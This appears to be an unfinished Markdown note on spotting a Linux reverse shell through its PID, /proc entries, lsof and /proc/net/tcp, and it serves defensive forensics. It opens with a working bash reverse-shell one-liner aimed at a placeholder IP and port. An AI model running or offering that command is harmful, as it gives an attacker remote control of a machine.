# Tracking Activity using PID
## reverse shells
```bash
bash -i >& /dev/tcp/IP_ADDRESS/PORT 0>&1
```

## List processes running
```bash
ps -auxw
```
Listing the processes should allow you to see the bash shell running. The shell will have the interactive (-i) flag. In general, this isn't terribly common and is a good place to start. 

```
add example of what the output will look like from ps command
```



## Change Directory to /proc/PID of the suspicious process
```bash

cd /proc/PID
ls -al
```

```bash
show out up
```

look for exe -> /usr/bin/bash
This shows the reverse shell is connected to this executable
```bash
show out up
```



##
```bash
/proc/PID/fd
ls -al
```
![/proc/pid/fd](https://redcanary.com/wp-content/uploads/2022/08/image2-1024x468.png "/proc/pid/fd")


you can see that stdin, stdout, and stderr are all connected to sockets and the inode number that we will see again later. This is a red flag. 
find out what those socket types are. Look for weird files open, payload dirs, etc.


## Search for file opened by this reverse shell
```bash
lsof -p PID
```
![lsof PID](https://redcanary.com/wp-content/uploads/2022/08/image1.png "lsof")

this will show the ip addresses of the remote host it has conencted to. Can also use tools like netstat or ss to see open sockets.


## check out /proc/net/tcp 
This will list all open TCP sockets and is the raw data networking tools use to show what is happening. Here we see the inode # of the open sockets and that they are connected to something with TCP.

```bash
cat /proc/net/tcp
```
This will show you the inode number that should match with the inode number shown when seeing the connection to stdin, stdout, stderr. 



### References:
 - https://x.com/craighrowland/status/1802850025443336414
 - https://www.halkynconsulting.co.uk/a/2020/11/linux-incident-response-guide/
 - https://library.mosse-institute.com/articles/2022/05/perform-remote-code-execution-with-the-use-of-reverse-shells/perform-remote-code-execution-with-the-use-of-reverse-shells.html
 - https://tomtietz.github.io/blog/2023/03/07/remote-shells.html
 - https://redcanary.com/blog/threat-detection/process-streams/
 - https://www.thedfirspot.com/post/linux-forensics-collecting-a-triage-image-using-the-uac-tool
 - https://aboutdfir.com/toolsandartifacts/linux/
 - https://www.linuxleo.com/
 - https://www.cybertriage.com/blog/collecting-linux-dfir-artifacts-with-uac/
 - https://linuxsecurity.expert/security-tools/
